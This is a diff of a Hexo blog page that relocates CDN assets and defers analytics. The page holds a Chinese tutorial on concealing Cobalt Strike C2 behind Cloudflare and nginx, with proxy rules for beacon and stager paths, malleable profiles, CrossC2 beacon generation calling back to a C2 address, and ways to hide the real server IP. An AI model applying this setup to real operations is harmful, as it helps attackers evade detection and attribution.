@@ -15,7 +15,11 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4"></script>
+<!--
+  gtag.js 从 googletagmanager.com 加载，该域名在中国大陆不可达；原来用 async 会一直挂住 window.load
+  （表现：页面一直转圈、Network 里那条请求长期 pending）。改为「等 load 之后再动态插入」。
+  上报不受影响，只是晚一点点；页面加载则完全不受第三方影响。
+-->
 <script>
     window.dataLayer = window.dataLayer || [];
     function gtag() {
@@ -24,27 +28,37 @@
 
     gtag('js', new Date());
     gtag('config', 'G-KYC8PY5RS4');
+    (function () {
+        function start() {
+            var s = document.createElement('script');
+            s.async = true;
+            s.src = 'https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4';
+            document.head.appendChild(s);
+        }
+        if (document.readyState === 'complete') { start(); }
+        else { window.addEventListener('load', start); }
+    })();
 </script>
 
 
     <title>CobaltStrike流量伪装与安全配置 | Yang Hao&#39;s blog</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
 
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
 	
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
 	
 	<!--prism-->
-	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>
+	<link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
+    <script src="/libs/prism/prism.js" async ></script>
 
 
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
+    <script src="/libs/jquery/jquery.min.js"></script>
 	<script src="/live2d-widget/autoload.js"></script>
 <meta name="generator" content="Hexo 5.4.2">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
@@ -59,7 +73,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Yang Hao&#39;s blog</span>
                 </a>
@@ -157,7 +171,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
         <div class="logo-name">Yang Hao&#39;s blog</div>
         <div class="logo-desc">
@@ -265,7 +279,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_9/f0214927bd28ba7a980c3f49a35e65c6.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/saymehi/2021_9/f0214927bd28ba7a980c3f49a35e65c6.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -283,7 +297,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
 <style>
     #articleContent h1::before,
     #articleContent h2::before,
@@ -453,10 +467,10 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>CobaltStrike在使用过程中经常会涉及到一些安全隐藏方面的配置，我使用的方案是CDN加上nginx转发，再使用profile来修改流量特征，本文对一些细节上的点进行记录，方便以后查阅。首先是域名和CDN上的配置，然后是CobaltStrike一些证书、profile的配置，最后是前置服务器(nginx)的一些配置方法。</p>
-<h2 id="2-CDN和域名相关配置"><a href="#2-CDN和域名相关配置" class="headerlink" title="2 CDN和域名相关配置"></a>2 CDN和域名相关配置</h2><p>在freenom申请测试域名(google.tk)后，到cloudflare中获取名称服务器地址:<br><img src="https://i.loli.net/2021/08/05/gYbmjWcxEZJnOFh.png"><br>然后在freenom中配置:<br><img src="https://i.loli.net/2021/08/05/amWJj8v31VLpd5i.png"></p>
-<p><img src="https://i.loli.net/2021/08/05/DUxprVQndS9sc8A.png"><br>CDN中配置A记录，解析IP，并使用代理：<br><img src="https://i.loli.net/2021/08/10/rytjsFLmpWhCDN3.png"><br>这样就能使用cloudflare的CDN加速了，然后开启nginx，配置server_name，访问：<br><img src="https://i.loli.net/2021/08/05/4SGJMUNEm3P18Li.png"></p>
-<p>接下来为域名配置源服务器证书，选择创建证书：<br><img src="https://i.loli.net/2021/08/05/H1fLYowxcvXWaP7.png"></p>
-<p><img src="https://i.loli.net/2021/08/05/clJkq84tH65aoxG.png"><br>将获取到的证书和key文件配置在nginx中，在ubuntu上修改nginx配置文件 <code>/etc/nginx/nginx.conf</code>：</p>
+<h2 id="2-CDN和域名相关配置"><a href="#2-CDN和域名相关配置" class="headerlink" title="2 CDN和域名相关配置"></a>2 CDN和域名相关配置</h2><p>在freenom申请测试域名(google.tk)后，到cloudflare中获取名称服务器地址:<br><img src="/images/loli/2021/08/05/gYbmjWcxEZJnOFh.png"><br>然后在freenom中配置:<br><img src="/images/loli/2021/08/05/amWJj8v31VLpd5i.png"></p>
+<p><img src="/images/loli/2021/08/05/DUxprVQndS9sc8A.png"><br>CDN中配置A记录，解析IP，并使用代理：<br><img src="/images/loli/2021/08/10/rytjsFLmpWhCDN3.png"><br>这样就能使用cloudflare的CDN加速了，然后开启nginx，配置server_name，访问：<br><img src="/images/loli/2021/08/05/4SGJMUNEm3P18Li.png"></p>
+<p>接下来为域名配置源服务器证书，选择创建证书：<br><img src="/images/loli/2021/08/05/H1fLYowxcvXWaP7.png"></p>
+<p><img src="/images/loli/2021/08/05/clJkq84tH65aoxG.png"><br>将获取到的证书和key文件配置在nginx中，在ubuntu上修改nginx配置文件 <code>/etc/nginx/nginx.conf</code>：</p>
 <pre><code class="line-numbers language-groovy">server {
     listen 443 ssl;
     server_name m.test.com;
@@ -472,8 +486,8 @@
     }
 }
 </code></pre>
-<p>配置好了 <code>nginx -t</code> 检查,然后<code>nginx -s reload</code>重载配置:<br><img src="https://i.loli.net/2021/08/05/TCl2UMb9B1JQj7p.png"></p>
-<p>证书配置好以后，在cloudflare中将SSL/TLS加密模式设置为严格：<br><img src="https://i.loli.net/2021/08/05/8b4o6EtMmQviIkx.png"><br>访问域名，严格的https已经启用，从客户端到CDN，CDN到服务器全部使用HTTPS：<br><img src="https://i.loli.net/2021/08/05/jzmSAcKO6NPxron.png"></p>
+<p>配置好了 <code>nginx -t</code> 检查,然后<code>nginx -s reload</code>重载配置:<br><img src="/images/loli/2021/08/05/TCl2UMb9B1JQj7p.png"></p>
+<p>证书配置好以后，在cloudflare中将SSL/TLS加密模式设置为严格：<br><img src="/images/loli/2021/08/05/8b4o6EtMmQviIkx.png"><br>访问域名，严格的https已经启用，从客户端到CDN，CDN到服务器全部使用HTTPS：<br><img src="/images/loli/2021/08/05/jzmSAcKO6NPxron.png"></p>
 <h2 id="3-nginx的反向代理配置"><a href="#3-nginx的反向代理配置" class="headerlink" title="3 nginx的反向代理配置"></a>3 nginx的反向代理配置</h2><p>反向代理配置就是匹配到特定的路径时，nginx将流量转发到后端的CobaltStrike处理，主要有四个路径，用于心跳和接收命令的GET包，用于返回命令执行结果等的POST包，剩下两个是x86和x64的stager，然后匹配到了就使用proxy_pass转发，比如后面会用到jq的profile，在profile中很容易找到这些url，然后配置nginx.conf关键部分如下：</p>
 <pre><code class="line-numbers language-nginx">server {
     listen 443 ssl;
@@ -506,7 +520,7 @@
     }
 }
 </code></pre>
-<h2 id="4-CobaltStrike服务配置"><a href="#4-CobaltStrike服务配置" class="headerlink" title="4 CobaltStrike服务配置"></a>4 CobaltStrike服务配置</h2><p>前置nginx基本配置好了后，接下来进行一些CobaltStrike的配置。主要是证书和profile配置。将压缩包上传到服务器解压后：<br><img src="https://i.loli.net/2021/08/08/G9FqjARPEr1nS8a.png"><br>先用keytool生成证书，这个证书可以用来作为管理端口(默认是50050)或者监听器的端口上的https证书，只要不用默认的随便配置就好：</p>
+<h2 id="4-CobaltStrike服务配置"><a href="#4-CobaltStrike服务配置" class="headerlink" title="4 CobaltStrike服务配置"></a>4 CobaltStrike服务配置</h2><p>前置nginx基本配置好了后，接下来进行一些CobaltStrike的配置。主要是证书和profile配置。将压缩包上传到服务器解压后：<br><img src="/images/loli/2021/08/08/G9FqjARPEr1nS8a.png"><br>先用keytool生成证书，这个证书可以用来作为管理端口(默认是50050)或者监听器的端口上的https证书，只要不用默认的随便配置就好：</p>
 <pre><code class="line-numbers language-cmd?linenums">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 1314520.com -validity 50000 -dname "CN=, OU=1314520.com, O=1314520.com, L=Redmond, S=Washington, C=US"
 
 keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12
@@ -526,8 +540,8 @@ set dns_idle        "8.8.8.8";   #dns的特征修改
 <p>持久化可以将下面的命令写入文件，如start_teamserver,chmod赋予执行权限后，可以方便地使用./start_teamserver启动，停止就用<code>pkill java</code>，脚本如下：</p>
 <pre><code class="line-numbers language-bash">nohup ./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile &gt;/dev/null 2&gt;&amp;1 &amp;
 </code></pre>
-<p>执行<code>./start_teamserver</code>后可以尝试连接vps5555端口的teamserver了:<br><img src="https://i.loli.net/2021/08/10/Iaywfv31V6HbgLh.png"></p>
-<h3 id="4-2-CobaltStrike监听器配置"><a href="#4-2-CobaltStrike监听器配置" class="headerlink" title="4.2 CobaltStrike监听器配置"></a>4.2 CobaltStrike监听器配置</h3><p>进入teamserver后，配置监听器。CDN在HTTPS上会检查SNI用不了域前置(http上可以修改host)，这里使用加速过的域名：<br><img src="https://i.loli.net/2021/08/10/RhiCeKNSg6WPDY5.png"><br>测试上线时会发现执行命令、执行stager不返回的情况，这是cdn缓存导致的，到CDN设置页面添加规则，对js文件绕过缓存：<br><img src="https://i.loli.net/2021/08/10/SiEUeATYO32w9uk.png"><br>配好后清除下缓存：<br><img src="https://i.loli.net/2021/08/10/fdCnIz91qYBpkNS.png"><br>然后测试上线和命令执行返回：<br><img src="https://i.loli.net/2021/08/10/yYZ1pXkCGiOBndm.png"></p>
+<p>执行<code>./start_teamserver</code>后可以尝试连接vps5555端口的teamserver了:<br><img src="/images/loli/2021/08/10/Iaywfv31V6HbgLh.png"></p>
+<h3 id="4-2-CobaltStrike监听器配置"><a href="#4-2-CobaltStrike监听器配置" class="headerlink" title="4.2 CobaltStrike监听器配置"></a>4.2 CobaltStrike监听器配置</h3><p>进入teamserver后，配置监听器。CDN在HTTPS上会检查SNI用不了域前置(http上可以修改host)，这里使用加速过的域名：<br><img src="/images/loli/2021/08/10/RhiCeKNSg6WPDY5.png"><br>测试上线时会发现执行命令、执行stager不返回的情况，这是cdn缓存导致的，到CDN设置页面添加规则，对js文件绕过缓存：<br><img src="/images/loli/2021/08/10/SiEUeATYO32w9uk.png"><br>配好后清除下缓存：<br><img src="/images/loli/2021/08/10/fdCnIz91qYBpkNS.png"><br>然后测试上线和命令执行返回：<br><img src="/images/loli/2021/08/10/yYZ1pXkCGiOBndm.png"></p>
 <h3 id="4-3-Linux和Windows中Profile通用配置"><a href="#4-3-Linux和Windows中Profile通用配置" class="headerlink" title="4.3 Linux和Windows中Profile通用配置"></a>4.3 Linux和Windows中Profile通用配置</h3><p>1.有时候我们想使用Crossc2来上线cs,但是我们的windows中配置了profile的，linux无法直接上线，所以需要在Crossc2中配置请求的路径，参考<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/tree/cs4.1/protocol_demo">协议演示</a>：<br>根据demo，准备了新的init.profile、init.c<br>init.profile：</p>
 <pre><code class="line-numbers language-gams">set sample_name "daidaiwoya";
 set sleeptime "2000";
@@ -726,9 +740,9 @@ void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outp
 <pre><code class="line-numbers language-stylus">gcc init.c -fPIC -shared -o init.so
 ./genCrossC2.Linux41 192.168.11.1 8086 .cobaltstrike.beacon_keys init.so Linux x64 ./shell
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/02/wkGnHh1BlFStJub.png"><br>然后执行<code>./shell</code>,成功地返回了beacon:<br><img src="https://i.loli.net/2021/08/02/x81X4CEf3y6uNrg.png"></p>
-<p>2.使用<a target="_blank" rel="noopener" href="https://github.com/Richard-Tang/CrossC2-C2Profile">CrossC2-C2Profile</a><br>在github上看到Richard-Tang师傅实现了jquery-c2.4.0.profile的兼容，进行了测试使用(profile日期报错的时候cs启动参数加上 <code>-Duser.language=en</code> )：<br><img src="https://i.loli.net/2021/08/02/rSohkVPEYxjXKBn.png"></p>
-<p>3.Linux在CDN中上线<br>在CrossC2_v2.2.4中不使用cdn，使用域名可以正常上线；使用cdn后web无日志，无上线；在v2.2.5中使用域名正常上线，但是心跳不稳定，一会就超时了。<br><img src="https://i.loli.net/2021/08/11/t2E8FbaAjlRsYNH.png"></p>
+<p><img src="/images/loli/2021/08/02/wkGnHh1BlFStJub.png"><br>然后执行<code>./shell</code>,成功地返回了beacon:<br><img src="/images/loli/2021/08/02/x81X4CEf3y6uNrg.png"></p>
+<p>2.使用<a target="_blank" rel="noopener" href="https://github.com/Richard-Tang/CrossC2-C2Profile">CrossC2-C2Profile</a><br>在github上看到Richard-Tang师傅实现了jquery-c2.4.0.profile的兼容，进行了测试使用(profile日期报错的时候cs启动参数加上 <code>-Duser.language=en</code> )：<br><img src="/images/loli/2021/08/02/rSohkVPEYxjXKBn.png"></p>
+<p>3.Linux在CDN中上线<br>在CrossC2_v2.2.4中不使用cdn，使用域名可以正常上线；使用cdn后web无日志，无上线；在v2.2.5中使用域名正常上线，但是心跳不稳定，一会就超时了。<br><img src="/images/loli/2021/08/11/t2E8FbaAjlRsYNH.png"></p>
 <h2 id="5-CDN后获取真实源IP"><a href="#5-CDN后获取真实源IP" class="headerlink" title="5 CDN后获取真实源IP"></a>5 CDN后获取真实源IP</h2><p>1.Cloudflare请求会自带X-Forwarded-For头，在nginx中设置一下X-Forwarded-For标头(不设置容易获取到127.0.0.1)，CobaltStrike需要在profile中开启 X-Forwarded-For 获取，<br>nginx.conf:</p>
 <pre><code class="line-numbers language-nginx">server {
         ...
@@ -798,7 +812,7 @@ set trust_x_forwarded_for "true";
         access_log  logs/www.xx.com.log  main;
 }
 </code></pre>
-<p>这里要注意一下，如果网站使用了HTTPS，默认情况下CDN会将http重写为https,存在原来80端口的服务访问不了的情况，可以在cdn中关闭自动重写：<br><img src="https://i.loli.net/2021/08/10/hVaCODR4tbjI9zw.png"></p>
+<p>这里要注意一下，如果网站使用了HTTPS，默认情况下CDN会将http重写为https,存在原来80端口的服务访问不了的情况，可以在cdn中关闭自动重写：<br><img src="/images/loli/2021/08/10/hVaCODR4tbjI9zw.png"></p>
 <h2 id="6-Nginx中server-name的配置"><a href="#6-Nginx中server-name的配置" class="headerlink" title="6 Nginx中server_name的配置"></a>6 Nginx中server_name的配置</h2><p>nginx中使用server_name定义虚拟主机名，设置server_name指定要处理的域名：</p>
 <pre><code class="line-numbers language-nginx">server {
     listen 80;
@@ -816,7 +830,7 @@ server {
     }
 }
 </code></pre>
-<p><img src="https://i.loli.net/2021/07/21/R6nbVug1tOWhXca.png"></p>
+<p><img src="/images/loli/2021/07/21/R6nbVug1tOWhXca.png"></p>
 <p>其他的默认情况：</p>
 <pre><code class="line-numbers language-nginx">server {
 listen 80;
@@ -830,16 +844,16 @@ if ($host != "www.qq.com") {
     }
 ｝
 </code></pre>
-<p><img src="https://i.loli.net/2021/07/21/NKA53bUMi1GjelI.png"></p>
-<p><img src="https://i.loli.net/2021/07/21/SpfTPxj4sc68AVU.png"></p>
-<h2 id="7-Nginx使用WAF"><a href="#7-Nginx使用WAF" class="headerlink" title="7 Nginx使用WAF"></a>7 Nginx使用WAF</h2><p>使用waf可以防御一些恶意扫描，这里使用了<a target="_blank" rel="noopener" href="http://openresty.org/cn/">openresty</a>来使用lua的<a target="_blank" rel="noopener" href="https://github.com/unixhot/waf">waf</a>，将waf代码放到lua/waf下，然后在nginx配置文件http段中添加引入即可：<br><img src="https://i.loli.net/2021/08/03/oNHk7TExQghsIAJ.png"></p>
+<p><img src="/images/loli/2021/07/21/NKA53bUMi1GjelI.png"></p>
+<p><img src="/images/loli/2021/07/21/SpfTPxj4sc68AVU.png"></p>
+<h2 id="7-Nginx使用WAF"><a href="#7-Nginx使用WAF" class="headerlink" title="7 Nginx使用WAF"></a>7 Nginx使用WAF</h2><p>使用waf可以防御一些恶意扫描，这里使用了<a target="_blank" rel="noopener" href="http://openresty.org/cn/">openresty</a>来使用lua的<a target="_blank" rel="noopener" href="https://github.com/unixhot/waf">waf</a>，将waf代码放到lua/waf下，然后在nginx配置文件http段中添加引入即可：<br><img src="/images/loli/2021/08/03/oNHk7TExQghsIAJ.png"></p>
 <pre><code class="line-numbers language-nginx">    # WAF
     lua_shared_dict limit 50m;
     lua_package_path "./lua\waf/?.lua;;";
     init_by_lua_file "./lua/waf/init.lua";
     access_by_lua_file "./lua/waf/access.lua";
 </code></pre>
-<p>可以在config.lua中进行详细的配置:<br><img src="https://i.loli.net/2021/08/03/ovENWjJAMLgFTy3.png"><br>触发规则会进行拦截:<br><img src="https://i.loli.net/2021/08/03/XNhlgasn3ecwYbZ.png"><br>各种规则可以在rule-config中详细配置。</p>
+<p>可以在config.lua中进行详细的配置:<br><img src="/images/loli/2021/08/03/ovENWjJAMLgFTy3.png"><br>触发规则会进行拦截:<br><img src="/images/loli/2021/08/03/XNhlgasn3ecwYbZ.png"><br>各种规则可以在rule-config中详细配置。</p>
 <h2 id="8-针对来源IP限制返回内容"><a href="#8-针对来源IP限制返回内容" class="headerlink" title="8 针对来源IP限制返回内容"></a>8 针对来源IP限制返回内容</h2><p>有时候请求不是走正常路径过来的，可以设置nginx只对CDN来源IP开放访问，其他地址拒绝(这个会和获取真实IP那个冲突，获取真实IP可以写在location块里，就不要写在server里了)：</p>
 <pre><code class="line-numbers language-nginx">http{
  #通过if判断值，如果是是CDN的IP，$allow_ip = 0,否则就是default 1。
@@ -873,12 +887,12 @@ server  {
             }
     }
 </code></pre>
-<h2 id="9-防止HTTPS访问IP泄露证书"><a href="#9-防止HTTPS访问IP泄露证书" class="headerlink" title="9 防止HTTPS访问IP泄露证书"></a>9 防止HTTPS访问IP泄露证书</h2><p>有时候会发现我们VPS的真实IP泄露了，在nginx配置不当时，就可以通过证书泄露IP，通过fofa看到在该IP上的证书：<br><img src="https://i.loli.net/2021/07/21/a4t9ZCTqcAwO3rK.png"><br>如果要防止nginx泄露IP，不能通过下列检查host来防御，依然会返回证书：</p>
+<h2 id="9-防止HTTPS访问IP泄露证书"><a href="#9-防止HTTPS访问IP泄露证书" class="headerlink" title="9 防止HTTPS访问IP泄露证书"></a>9 防止HTTPS访问IP泄露证书</h2><p>有时候会发现我们VPS的真实IP泄露了，在nginx配置不当时，就可以通过证书泄露IP，通过fofa看到在该IP上的证书：<br><img src="/images/loli/2021/07/21/a4t9ZCTqcAwO3rK.png"><br>如果要防止nginx泄露IP，不能通过下列检查host来防御，依然会返回证书：</p>
 <pre><code class="line-numbers language-bash">if ($host != "www.qq.com") {
         return 400;
 }
 </code></pre>
-<p>一、可以给IP配置一个自签名的证书，通过https访问IP时返回的就是这个自签名的证书<br>1.免费证书可以在csr.chinassl.net和Let’s Encrypt获取，以csr.chinassl.net为例：<br><img src="https://i.loli.net/2021/07/21/pEJN2s3IwTVPCB8.png"><br>然后下载得到CSR文件和KEY文件，然后上传CSR生成证书即可：<br><img src="https://i.loli.net/2021/07/21/eg9ADmYodHzXkOt.png"><br>获取后会得到.crt文件，在nginx中配置即可。</p>
+<p>一、可以给IP配置一个自签名的证书，通过https访问IP时返回的就是这个自签名的证书<br>1.免费证书可以在csr.chinassl.net和Let’s Encrypt获取，以csr.chinassl.net为例：<br><img src="/images/loli/2021/07/21/pEJN2s3IwTVPCB8.png"><br>然后下载得到CSR文件和KEY文件，然后上传CSR生成证书即可：<br><img src="/images/loli/2021/07/21/eg9ADmYodHzXkOt.png"><br>获取后会得到.crt文件，在nginx中配置即可。</p>
 <p>当然了,还可以使用openssl（windows下载:<a target="_blank" rel="noopener" href="https://slproweb.com/products/Win32OpenSSL.html%EF%BC%89%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E7%9A%84%E8%AF%81%E4%B9%A6%EF%BC%9A">https://slproweb.com/products/Win32OpenSSL.html）命令生成自签名的证书：</a></p>
 <pre><code class="line-numbers language-cmd">openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout ssl.key -out https.crt
 </code></pre>
@@ -897,7 +911,7 @@ server  {
     }
 }
 </code></pre>
-<p>这样一来访问IP就使用这个自签名的证书，访问域名就使用域名的证书，不会造成IP和域名关联。<br>二、不配置证书，使用CDN灵活模式<br>灵活模式是指客户端与CDN进行HTTPS通信，CDN与服务器HTTP通信，这样证书来源直接就是CDN的，nginx只需要在80端口配置即可：<br><img src="https://i.loli.net/2021/07/30/84bqCA6IvBWeOZY.png" alt="灵活模式"><br>边缘证书中设置始终使用HTTPS:<br><img src="https://i.loli.net/2021/07/30/8dlsYFL6ctDTxu4.png"><br>访问网站，查看证书：<br><img src="https://i.loli.net/2021/07/21/bJRVhYvtU1cqyB2.png"><br>这种方式确实灵活,不用配证书,可以将http的访问自动重写为https。还可以在边缘证书中设置一个随机加密(HTTP/2)，访问的时候是http,但是会使用加密：<br><img src="https://i.loli.net/2021/08/19/Ud7rW9RYjEJMDan.png"></p>
+<p>这样一来访问IP就使用这个自签名的证书，访问域名就使用域名的证书，不会造成IP和域名关联。<br>二、不配置证书，使用CDN灵活模式<br>灵活模式是指客户端与CDN进行HTTPS通信，CDN与服务器HTTP通信，这样证书来源直接就是CDN的，nginx只需要在80端口配置即可：<br><img src="/images/loli/2021/07/30/84bqCA6IvBWeOZY.png" alt="灵活模式"><br>边缘证书中设置始终使用HTTPS:<br><img src="/images/loli/2021/07/30/8dlsYFL6ctDTxu4.png"><br>访问网站，查看证书：<br><img src="/images/loli/2021/07/21/bJRVhYvtU1cqyB2.png"><br>这种方式确实灵活,不用配证书,可以将http的访问自动重写为https。还可以在边缘证书中设置一个随机加密(HTTP/2)，访问的时候是http,但是会使用加密：<br><img src="/images/loli/2021/08/19/Ud7rW9RYjEJMDan.png"></p>
 <h2 id="10-参考链接"><a href="#10-参考链接" class="headerlink" title="10 参考链接"></a>10 参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/unixhot/waf">https://github.com/unixhot/waf</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-">https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-</a></p>
@@ -976,12 +990,12 @@ server  {
                     
                 </div>
                 <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/css/share.min.css">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
     <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/js/social-share.min.js"></script>
+    <script src="/libs/share/js/social-share.min.js"></script>
     
 
     
@@ -1248,8 +1262,8 @@ server  {
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/av-min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/Valine.min.js"></script>
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#vcomments',
@@ -1281,7 +1295,7 @@ server  {
                 <a href="/2021/10/05/webgoat-ba-chang-diao-shi-huan-jing-pei-zhi/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8509b1add189e4272eea5a7df80740df.png" class="responsive-img" alt="Webgoat靶场调试环境配置">
+                        <img src="/images/saymehi/2021_10/8509b1add189e4272eea5a7df80740df.png" class="responsive-img" alt="Webgoat靶场调试环境配置">
                         
                         <span class="card-title">Webgoat靶场调试环境配置</span>
                     </div>
@@ -1333,7 +1347,7 @@ server  {
                 <a href="/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="PHPStorm+PHPStudy调试配置">
+                        <img src="/images/saymehi/2021_11/e0f5f87f01e358d667c07683c647c83e.jpg" class="responsive-img" alt="PHPStorm+PHPStudy调试配置">
                         
                         <span class="card-title">PHPStorm+PHPStudy调试配置</span>
                     </div>
@@ -1421,21 +1435,21 @@ server  {
 
 
 <!-- 代码块功能依赖 -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeLang.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeShrink.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
 <!-- 代码块折行 -->
@@ -1459,7 +1473,7 @@ server  {
 </div>
 
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.min.js"></script>
+<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
     $(function () {
         tocbot.init({
@@ -1691,10 +1705,10 @@ $(document).ready(function() {
     </div>
